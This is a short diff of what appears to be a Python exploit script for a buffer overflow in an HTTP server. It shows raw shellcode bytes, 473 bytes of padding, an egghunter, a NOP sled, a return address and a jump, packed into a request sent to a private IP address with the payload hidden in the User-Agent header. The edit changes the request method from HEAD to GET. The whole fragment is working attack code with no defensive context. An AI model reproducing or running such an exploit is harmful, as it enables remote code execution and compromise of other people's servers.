@@ -20,7 +20,7 @@ msi = "\xbb\x35\xde\x7f\x77\xff\xd3\x89\xc5\x31\xc0\x50\x68\x20\x2f\x71\x6e\x68\
 
 stuff = "A"*473 + egghunter + "\x90"*10 + "\xce\x57\xae\x77" + "\xeb\x86"
 otherstuff = "dudedude" + msi
-buffer =  "HEAD /" + stuff + " HTTP/1.1\r\n"
+buffer =  "GET /" + stuff + " HTTP/1.1\r\n"
 buffer += "Host: 172.16.0.24:8080\r\n"
 buffer += "User-Agent: "+ otherstuff + "\r\n"
 buffer += "Keep-Alive: 115\r\n"
